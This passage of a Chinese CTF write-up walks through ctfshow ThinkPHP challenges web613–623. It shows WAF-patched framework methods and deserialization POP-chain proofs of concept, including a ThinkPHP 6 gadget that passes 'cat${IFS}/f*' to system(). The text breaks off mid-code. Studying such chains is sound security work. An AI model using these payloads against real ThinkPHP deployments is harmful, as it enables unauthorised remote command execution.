<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>新增的waf：</p>
<p>..&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;Request.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token comment">/**
    * 当前是否Pjax请求
    * @access public
    * @param  bool $pjax  true 获取原始pjax请求
    * @return bool
    */</span>
   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">isPjax</span><span class="token punctuation">(</span><span class="token variable">$pjax</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
       <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">server</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'HTTP_X_PJAX'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">true</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span> <span class="token operator">===</span> <span class="token variable">$pjax</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">;</span>
       <span class="token comment">#$result           = $this->param($this->config['var_pjax']) ? true : $result;</span>
       <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mergeParam</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
       <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web614（禁write）"><a href="#web614（禁write）" class="headerlink" title="web614（禁write）"></a>web614（禁write）</h1><p>上一题的poc秒了</p>
<p>新增waf：</p>
<p>..&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;template&#x2F;driver&#x2F;File.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token comment">/**
    * 写入编译缓存
    * @access public
    * @param  string $cacheFile 缓存的文件名
    * @param  string $content 缓存的内容
    * @return void|array
    */</span>
   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
       <span class="token comment">// 检测模板目录</span>
       <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token comment">// 生成模板缓存文件</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cache write error:'</span> <span class="token operator">.</span> <span class="token variable">$cacheFile</span><span class="token punctuation">,</span> <span class="token number">11602</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看起来是ban了利用缓存写马的方法</p>
<hr>
<h1 id="web615（禁read）"><a href="#web615（禁read）" class="headerlink" title="web615（禁read）"></a>web615（禁read）</h1><p>上一题的poc秒了</p>
<p>新增waf：</p>
<p>..&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;template&#x2F;driver&#x2F;File.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token comment">/**
    * 读取编译编译
    * @access public
    * @param  string  $cacheFile 缓存的文件名
    * @param  array   $vars 变量数组
    * @return void
    */</span>
   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">,</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
       <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cacheFile</span> <span class="token operator">=</span> <span class="token variable">$cacheFile</span><span class="token punctuation">;</span>
       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$vars</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token comment">// 模板阵列变量分解成为独立变量</span>
           <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$vars</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>

       <span class="token comment">//载入模版缓存文件</span>
       <span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cacheFile</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web616（禁display）"><a href="#web616（禁display）" class="headerlink" title="web616（禁display）"></a>web616（禁display）</h1><p>上题poc秒了</p>
<p>新waf：</p>
<p>..&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;view&#x2F;driver&#x2F;Php.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token comment">/**
    * 渲染模板内容
    * @access public
    * @param  string    $content 模板内容
    * @param  array     $data 模板变量
    * @return void
    */</span>
   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">display</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
       <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?>'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>感觉像是之前的show方法命令执行？</p>
<hr>
<h1 id="web617（禁fetch）"><a href="#web617（禁fetch）" class="headerlink" title="web617（禁fetch）"></a>web617（禁fetch）</h1><p>上题poc秒了</p>
<p>新waf：</p>
<p>..&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;view&#x2F;driver&#x2F;Php.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token comment">/**
    * 渲染模板文件
    * @access public
    * @param  string    $template 模板文件
    * @param  array     $data 模板变量
    * @return void
    */</span>
   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">fetch</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">''</span> <span class="token operator">==</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token comment">// 获取模板文件名</span>
           <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">parseTemplate</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>

       <span class="token comment">// 模板不存在 抛出异常</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateNotFoundException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'template not exists:'</span> <span class="token operator">.</span> <span class="token variable">$template</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>

       <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span> <span class="token operator">=</span> <span class="token variable">$template</span><span class="token punctuation">;</span>

       <span class="token comment">// 记录视图信息</span>
       <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">app</span>
           <span class="token operator">-></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ VIEW ] '</span> <span class="token operator">.</span> <span class="token variable">$template</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' [ '</span> <span class="token operator">.</span> <span class="token function">var_export</span><span class="token punctuation">(</span><span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' ]'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

       <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>估计还是show和变量覆盖的rce</p>
<hr>
<h1 id="web618（禁invokeFunction）"><a href="#web618（禁invokeFunction）" class="headerlink" title="web618（禁invokeFunction）"></a>web618（禁invokeFunction）</h1><p>上题poc秒了</p>
<p>新waf：</p>
<p>..&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;Container.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token comment">/**
    * 执行函数或者闭包方法 支持参数调用
    * @access public
    * @param  mixed  $function 函数或者闭包
    * @param  array  $vars     参数
    * @return mixed
    */</span>
   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">invokeFunction</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>	
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
           <span class="token variable">$reflect</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionFunction</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

           <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">bindParams</span><span class="token punctuation">(</span><span class="token variable">$reflect</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

           <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ReflectionException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'function not exists: '</span> <span class="token operator">.</span> <span class="token variable">$function</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'()'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>是上面未开启强制路由rce的反射方法</p>
<hr>
<h1 id="web619（禁each）"><a href="#web619（禁each）" class="headerlink" title="web619（禁each）"></a>web619（禁each）</h1><p>上题poc又秒了。。</p>
<p>新waf：</p>
<p>..&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;Collection.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token comment">/**
    * 给每个元素执行个回调
    *
    * @access public
    * @param  callable $callback
    * @return $this
    */</span>
   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">each</span><span class="token punctuation">(</span><span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">items</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$callback</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
               <span class="token keyword">break</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
               <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">items</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
       <span class="token punctuation">&#125;</span>

       <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不懂</p>
<hr>
<h1 id="web620（禁map）"><a href="#web620（禁map）" class="headerlink" title="web620（禁map）"></a>web620（禁map）</h1><p>poc一穿八了</p>
<p>新waf：</p>
<p>..&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;Collection.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token comment">/**
    * 用回调函数处理数组中的元素
    * @access public
    * @param  callable|null $callback
    * @return static
    */</span>
   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">map</span><span class="token punctuation">(</span><span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">static</span><span class="token punctuation">(</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">items</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不懂</p>
<hr>
<h1 id="web621（禁filter）"><a href="#web621（禁filter）" class="headerlink" title="web621（禁filter）"></a>web621（禁filter）</h1><p>一穿九</p>
<p>新waf：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token comment">/**
    * 用回调函数过滤数组中的元素
    * @access public
    * @param  callable|null $callback
    * @return static
    */</span>
   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">static</span><span class="token punctuation">(</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">items</span><span class="token punctuation">,</span> <span class="token variable">$callback</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>

       <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">static</span><span class="token punctuation">(</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">items</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web622（禁reduce）"><a href="#web622（禁reduce）" class="headerlink" title="web622（禁reduce）"></a>web622（禁reduce）</h1><p>一穿十！</p>
<p>新waf：</p>
<p>..&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;Collection.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">   <span class="token comment">/**
    * 通过使用用户自定义函数，以字符串返回数组
    *
    * @access public
    * @param  callable $callback
    * @param  mixed    $initial
    * @return mixed
    */</span>
   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">reduce</span><span class="token punctuation">(</span><span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token variable">$initial</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"此链不通"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token function">array_reduce</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">items</span><span class="token punctuation">,</span> <span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token variable">$initial</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="input链"><a href="#input链" class="headerlink" title="input链"></a>input链</h1><p>前面那个通杀的poc是基于param方法的</p>
<p>现在我们直接利用input方法，即从<code>__call</code>直接进到<code>input</code></p>
<p>全局搜input</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240311173839714.png" alt="image-20240311173839714"></p>
<p>则poc改成</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">route</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'0w0'</span><span class="token operator">=></span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'visible'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"route"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240311174131184.png" alt="image-20240311174131184"></p>
<p>poc改成</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">get</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'0w0'</span><span class="token operator">=></span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'visible'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"get"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240311174402345.png" alt="image-20240311174402345"></p>
<p>poc改成</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'visible'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"post"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后发post请求rce</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240311174555442.png" alt="image-20240311174555442"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'visible'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"put"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>put请求</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240311174620848.png" alt="image-20240311174620848"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'visible'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"request"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>get或者post都可以</p>
<p>说白了就是请求方法不同</p>
<hr>
<h1 id="TP6"><a href="#TP6" class="headerlink" title="TP6"></a>TP6</h1><h1 id="web623（TP6反序列化）"><a href="#web623（TP6反序列化）" class="headerlink" title="web623（TP6反序列化）"></a>web623（TP6反序列化）</h1><p>报错显示v6.0.8，但是可以用6.0.1的链打掉</p>
<p>poc：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span>
<span class="token keyword">trait</span> <span class="token class-name-definition class-name">Attribute</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token string double-quoted-string">"cat\$&#123;IFS&#125;/f*"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>
<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$withEvent</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$force</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
